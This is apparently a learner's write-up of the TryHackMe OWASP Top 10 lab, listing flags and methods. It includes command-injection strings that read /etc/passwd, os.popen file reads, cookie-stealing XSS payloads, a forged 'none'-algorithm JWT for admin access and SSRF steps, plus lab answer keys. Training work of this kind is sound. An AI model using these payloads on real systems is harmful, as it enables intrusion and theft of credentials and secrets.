# TryHackMe-OWASP-Top-10

## Broken Access Control
Nothing Special was there, read an article about Broken Access Control how it works.

![Broken access control](https://github.com/user-attachments/assets/3e1ec8bf-14cb-453e-a733-fb2e9181475a)

## Broken Access Control (IDOR Challenge)

#### Deploy the machine and go to http://10.10.134.128 - Login with the username being noot and the password test1234.
- Ans: flag{fivefourthree} 
- Method: Edit the note=0

![image](https://github.com/user-attachments/assets/f799b170-7a9a-42cf-a7d6-b6c8013d708f)

## Security Misconfigarations

#### Hack into the webapp, and find the flag!
-Ans: 

The Web app looks like this and we tried default common password "admin:admin", but that dosen't work at all. So i search into the google and find default password for pensive notes in the Github.

![image](https://github.com/user-attachments/assets/07164e08-c2e6-4860-91ce-41cc156330ae)

![image](https://github.com/user-attachments/assets/3aa7623f-2592-4da6-aa07-c0470a5e6159)

![image](https://github.com/user-attachments/assets/14ee6eb2-e570-4349-bd76-d856921447cd)


## Cryptographic Failures

#### What is the name of the mentioned directory?
- Ans: /assets
  
![image](https://github.com/user-attachments/assets/d72fe275-95d4-4295-8be1-0f76070a2d80)

#### Navigate to the directory you found in question one. What file stands out as being likely to contain sensitive data?
- Ans: webapp.db

#### Use the supporting material to access the sensitive data. What is the password hash of the admin user?
- Step 1: sqlite3 webapp.db
- Step 2: .tables
- Step 3: SELECT * FROM users;
- Ans: 6eea9b7ef19179a06954edd0f6c05ceb

![image](https://github.com/user-attachments/assets/9ca97d7b-f9d9-4fca-b1e6-8fcbc4b889ad)


#### What is the admin's plaintext password?
- Method: Go to the crack station website and paste the admin password hash we found from the previous question.
- Ans: qwertyuiop

![image](https://github.com/user-attachments/assets/06e8ab69-803b-4408-b1a8-e1e8fb68c225)


#### Log in as the admin. What is the flag?
 Ans: THM{Yzc2YjdkMjE5N2VjMzNhOTE3NjdiMjdl}

## Command Injection

#### What strange text file is in the website's root directory?
- Command: $(ls)
- Ans: drpepper.txt

![image](https://github.com/user-attachments/assets/9a75fffa-1535-44bb-8290-a9f454c8b999)

#### How many non-root/non-service/non-daemon users are there?
- Command: $(cat /etc/passwd)
- Ans: 0

#### What user is this app running as?
- Command: $(whoami)

![image](https://github.com/user-attachments/assets/32d73958-83ec-4bb8-8dcd-682ff23f034a)

#### What is the user's shell set as?
- Command: $(cat /etc/passwd)
- Ans : /sbin/nologin

#### What version of Alpine Linux is running?
- Command: $(cat /etc/alpine-release)
- Ans: 3.16.0
- 
![image](https://github.com/user-attachments/assets/3aa150f3-d1f4-4769-833a-414f84fc2706)

## Insecure Design

#### What is the value of the flag in joseph's account?
- Ans: THM{Not_3ven_c4tz_c0uld_sav3_U!}

## Security Misconfiguration

#### What is the database file name (the one with the .db extension) in the current directory?
- Command: import os; print(os.popen("ls -l").read())
- Ans: todo.db

![image](https://github.com/user-attachments/assets/e09dec61-d6f1-42f2-9e30-3e9c89ee700a)

#### Modify the code to read the contents of the app.py file, which contains the application's source code. What is the value of the secret_flag variable in the source code?
- Command: import os; print(os.popen("cat app.py").read())
- Ans: THM{Just_a_tiny_misconfiguration}

![image](https://github.com/user-attachments/assets/4e516742-8e3b-421d-bf9e-2a36110f695a)

## Cross Site Scripting (XSS)

#### Navigate to http://MACHINE_IP/ in your browser and click on the "Reflected XSS" tab on the navbar; craft a reflected XSS payload that will cause a popup saying "Hello".
- payload: <script>alert("Hello")</script>
- Ans: ThereIsMoreToXSSThanYouThink

![image](https://github.com/user-attachments/assets/91f12b86-d2ce-4857-88f1-9e1ce6da0f12)

#### On the same reflective page, craft a reflected XSS payload that will cause a popup with your machines IP address.
- Ans: ReflectiveXss4TheWin

![image](https://github.com/user-attachments/assets/0913320e-ea44-4b5e-b3e8-972b5badd7ae)


#### Now navigate to http://MACHINE_IP/ in your browser and click on the "Stored XSS" tab on the navbar; make an account.
Then add a comment and see if you can insert some of your own HTML.
- Payload: <span>I am a hacker</span>
- Ans: HTML_T4gs

![image](https://github.com/user-attachments/assets/5ae3efe9-b134-4c71-93e7-e8054966e46f)


#### On the same page, create an alert popup box appear on the page with your document cookies.
- Payment: <script>alert(document.cookie)</script>
- Ans: W3LL_D0N3_LVL2

![image](https://github.com/user-attachments/assets/e3e60e7c-7171-4446-ac5f-87afc903a878)


#### Change "XSS Playground" to "I am a hacker" by adding a comment and using Javascript.
- Payload: <script>document.querySelector('#thm-title').textContent="I am a hacker"</script>
- Ans: websites_can_be_easily_defaced_with_xss

![image](https://github.com/user-attachments/assets/e9288f05-d247-4472-b75e-9ccff24fc3d4)


## Vulnerable and Outdated Components

![image](https://github.com/user-attachments/assets/b8cb3ef5-45f0-4635-a3d2-955ac62cd199)

## Vulnerable and Outdated Components

![image](https://github.com/user-attachments/assets/9d167cb0-d3d7-487f-abea-7ee49076a1eb)

#### What is the content of the /opt/flag.txt file?
- Ans: THM{But_1ts_n0t_myf4ult!}

This task is about exploiting outdated components. Open Firefox then head to the given site. Looking at the site we learn that this is a bookstore app. Go to the Exploit database site and search for the keywords “bookstore”.

![image](https://github.com/user-attachments/assets/833410a1-e387-4339-93e5-c1eb728a0cec)

Download the exploit [47887.py] and use the command: 

![image](https://github.com/user-attachments/assets/383e9f42-6124-4a98-8341-208f9ee4d22e)

## Identification and Authentication Failure

![image](https://github.com/user-attachments/assets/636e0d30-a347-40a3-868b-34304674b0c0)

#### What is the flag that you found in darren's account?

![image](https://github.com/user-attachments/assets/0a92341c-3ec4-4b51-9395-aadf9d541720)

#### What is the flag that you found in arthur's account?

![image](https://github.com/user-attachments/assets/4a0805cf-8d8c-46a9-a999-257a1bddc7e5)

## Software and Data Intrigrity Failure

![image](https://github.com/user-attachments/assets/0a746686-5117-4e68-899d-669b82284d42)

## Software Integrity Failures

#### What is the SHA-256 hash of https://code.jquery.com/jquery-1.12.4.min.js?
- Ans: sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=

![image](https://github.com/user-attachments/assets/972822de-55d7-4dea-892f-030b99d1cea0)

## Data Integrity Failures

#### Try logging into the application as guest. What is guest's account password?
- Ans: guest

![image](https://github.com/user-attachments/assets/43135616-3280-4f4e-adf5-409b3a9c6b13)

#### What is the name of the website's cookie containing a JWT token?
- Ans: jwt-session

#### What is the flag presented to the admin user?
- Ans: THM{Dont_take_cookies_from_strangers}

![image](https://github.com/user-attachments/assets/2d3892fe-2086-4452-bca3-70b183923065)

After login as a user inspect the page and go to "storage" > in cookies you will find the value. After finding the value you have to decode the value of header, payload. To decode this value use this site: https://appdevtools.com/base64-encoder-decoder

![image](https://github.com/user-attachments/assets/4d2ddbd2-b9b8-4ce0-a0a7-3531121414fd)

After decoding chagnge Header "HS256" to "none" and Payload "guest" to "admin" and then encode Header and Payload. 
- Header: {"typ":"JWT","alg":"none"}
- Payload: {"username":"admin","exp":1731860038}
After encoding
- Header: eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0=.
- Payload: eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzMxODYwMDM4fQ==.
- eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0=.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzMxODYwMDM4fQ==.

#### Paste this into the value and refresh the page 

![image](https://github.com/user-attachments/assets/93caa6ba-f716-47ad-8978-e88b4fa69ddd)

## Security logging and Monitoring Failures

![image](https://github.com/user-attachments/assets/1bda9362-3b4a-4354-9d9d-f9e398cbc33e)


#### What IP address is the attacker using?
- Ans: 49.99.13.16

#### What kind of attack is being carried out?
- Ans: Brute force

## Server-Side Request Forgery (SSRF)

#### Explore the website. What is the only host allowed to access the admin area?
- Ans: localhost

![image](https://github.com/user-attachments/assets/75415461-c00c-4388-b1c1-47d2fe97aba6)

#### Check the "Download Resume" button. Where does the server parameter point to?
- Ans: secure-file-storage.com

![image](https://github.com/user-attachments/assets/b25844dc-783f-41fe-9827-7fd2fb8ef287)

#### Using SSRF, make the application send the request to your AttackBox instead of the secure file storage. Are there any API keys in the intercepted request?
- Ans: THM{Hello_Im_just_an_API_key}

